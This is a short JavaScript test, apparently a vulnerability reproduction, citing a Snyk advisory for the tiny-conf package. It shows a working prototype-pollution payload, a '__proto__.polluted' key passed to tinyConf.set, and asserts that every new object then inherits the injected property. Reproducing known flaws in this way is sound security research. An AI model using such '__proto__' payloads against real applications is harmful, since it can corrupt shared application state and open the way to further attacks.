//https://snyk.io/vuln/SNYK-JS-TINYCONF-598792
test("prototype pollution in tinyConf", () => {
  const tinyConf = require("tiny-conf");
  obj = {};

  expect({}.polluted).toBe(undefined);

  tinyConf.set("__proto__.polluted", "yes");
  expect({}.polluted).toBe("yes");
});
